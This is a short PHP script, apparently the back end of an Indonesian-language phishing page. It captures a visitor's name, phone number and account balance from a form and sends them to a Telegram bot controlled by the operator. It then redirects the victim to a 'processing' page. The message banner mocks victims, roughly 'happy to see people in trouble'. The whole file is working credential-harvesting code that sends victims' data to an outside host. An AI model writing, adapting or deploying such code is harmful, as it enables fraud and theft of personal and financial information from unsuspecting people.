<?php
include "telegram.php";
session_start();
$name = $_POST['name'];
$nomor = $_POST['nomor'];
$saldo = $_POST['saldo'];

$_SESSION['name'] = $name;
$_SESSION['nomor'] = $nomor;
$_SESSION['saldo'] = $saldo;


$message = "
✧━━━━━━[ 🅂🄼🅂 ]━━━━━━✧
 𝘴𝘦𝘯𝘢𝘯𝘨 𝘮𝘦𝘭𝘪𝘩𝘢𝘵 𝘰𝘳𝘢𝘯𝘨 𝘴𝘶𝘴𝘢𝘩

• nama : ".$name."
• no hp : ".$nomor."
• saldo : ".$saldo."
";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $message, $id_bot);
header('Location:proses.html');
?>
